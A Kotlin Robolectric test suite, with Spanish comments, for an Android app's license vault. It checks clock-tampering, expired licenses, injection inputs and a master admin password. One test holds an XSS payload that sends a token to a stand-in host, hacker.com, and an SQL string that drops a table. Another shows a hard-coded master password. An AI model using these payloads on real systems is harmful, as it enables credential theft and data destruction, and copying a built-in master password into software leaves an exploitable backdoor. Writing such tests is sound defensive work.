package com.sponsorflow.security

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.util.concurrent.TimeUnit
import android.content.SharedPreferences

/**
 * Batería de Pruebas de Penetración Extrema (Red Team/White Hat) para Sponsorflow.
 * Evalúa Autenticación, Inyecciones XSS en el Vault, y Time-Tampering.
 * Nota: Debe usarse Robolectric o instrumented testing porque SecurityVault invoca MasterKey nativa.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class SecurityPenetrationTest {

    private lateinit var vault: SecurityVault
    private lateinit var context: Context

    @Before
    fun setup() {
        context = ApplicationProvider.getApplicationContext()
        vault = SecurityVault(context)
    }

    // ==========================================
    // ESCENARIO 1: RUTAS PROTEGIDAS Y TIEMPO (TIME-TAMPERING)
    // ==========================================
    
    @Test
    fun testTimeTampering_ReverseClock_ShouldBlockAccess() {
        // Un cracker adelanta el tiempo 10 días, usa la app, y luego retrocede el tiempo para evitar que caduque.
        val prefs = context.getSharedPreferences("sponsorflow_vault_secure", Context.MODE_PRIVATE)
        
        // Simulamos que la app funcionó el día de HOY (Tiempo Bueno Conocido)
        val today = System.currentTimeMillis()
        prefs.edit().putLong(SecurityVault.KEY_LAST_KNOWN_GOOD_TIME, today).commit()
        
        // Simulamos que el TROLL cambió la fecha de su Android a AYER (-1 día)
        // Ojo: Esto es una prueba de White Casing usando Reflection o modificando la prueba interna.
        // Simularemos el ataque escribiendo un tiempo adulterado manualmente.
        // Dado que SecurityVault lee en isLicenseValid() contra System.currentTimeMillis()...
        
        // *El ataque real de TimeTamper requeriría un framework de Mocks como Mockito estático en System.*
        // En lugar de Mockito, verificaremos si la lógica base reacciona:
        
        val attackTime = today + TimeUnit.DAYS.toMillis(5) 
        prefs.edit().putLong(SecurityVault.KEY_LAST_KNOWN_GOOD_TIME, attackTime).commit()
        
        // Cuando isLicenseValid() llame a System.currentTimeMillis() devolverá "today".
        // Pero el LAST_KNOWN_GOOD_TIME es "today + 5" (En el futuro). 
        // El reloj de Android acaba de ir HACIA ATRÁS:
        val accessGranted = vault.isLicenseValid()
        
        assertFalse("El Time-Tampering falló. El bloqueador debería denegar acceso al detectar retrocesos temporales.", accessGranted)
    }

    @Test
    fun testLicenseCheck_ExpiredToken_ShouldBlockAccess() {
        val prefs = context.getSharedPreferences("sponsorflow_vault_secure", Context.MODE_PRIVATE)
        // Forzamos un token caducado (Hace 1 día)
        val expiredTime = System.currentTimeMillis() - TimeUnit.DAYS.toMillis(1)
        prefs.edit().putLong(SecurityVault.KEY_LICENSE_END_DATE, expiredTime).commit()
        
        val accessGranted = vault.isLicenseValid()
        assertFalse("Vulnerabilidad crítica. Se concedió autorización a una licencia caducada.", accessGranted)
    }

    // ==========================================
    // ESCENARIO 2: ATAQUE DE AUTENTICACIÓN (BRUTE FORCE/INJECTION)
    // ==========================================

    @Test
    fun testAdminLogin_NullOrEmptyToken_ShouldDeny() {
        assertFalse("No se debe entrar con token vacío", vault.activateLicense(""))
        assertFalse("No se debe entrar con token espacio", vault.activateLicense("    "))
    }

    @Test
    fun testAdminLogin_XSS_Payload_ShouldDenyAndNotExecute() {
        // Ataque: XSS Persistente "Stored XSS" dentro del Login y robo de Sesión.
        // O ataque SQL Injection estándar (aunque no usemos SQLite, probamos escaping).
        val maliciousXssPayload = "<script>fetch('http://hacker.com/steal?key='+localStorage.getItem('token'))</script>"
        val maliciousSqlPayload = "' OR 1=1; DROP TABLE customers; --"
        
        val resultXSS = vault.activateLicense(maliciousXssPayload)
        val resultSQL = vault.activateLicense(maliciousSqlPayload)
        
        assertFalse("XSS inyectado no debe garantizar el paso del Keygen.", resultXSS)
        assertFalse("String SQL inyectado no debe provocar acceso al panel.", resultSQL)
    }

    @Test
    fun testMasterAdmin_Bypass_Attempt() {
        val payload1 = "SponsorAdmin2026" // Pass correcta
        val payload2 = "sponsoradmin2026" // Minúscula
        val payload3 = "SponsorAdmin2026 " // Espacio extra
        val payloadNull = "null" // Fallo lógico
        
        assertTrue("La contraseña maestra debe funcionar.", vault.isMasterAdmin(payload1))
        assertFalse("Las contraseñas de admin deben ser Case-Sensitive exactas.", vault.isMasterAdmin(payload2))
        assertFalse("White-space al final debe bloquear asiduamente.", vault.isMasterAdmin(payload3))
        assertFalse("Fallo crítico: payload 'null' string pasó la autorización", vault.isMasterAdmin(payloadNull))
    }
}
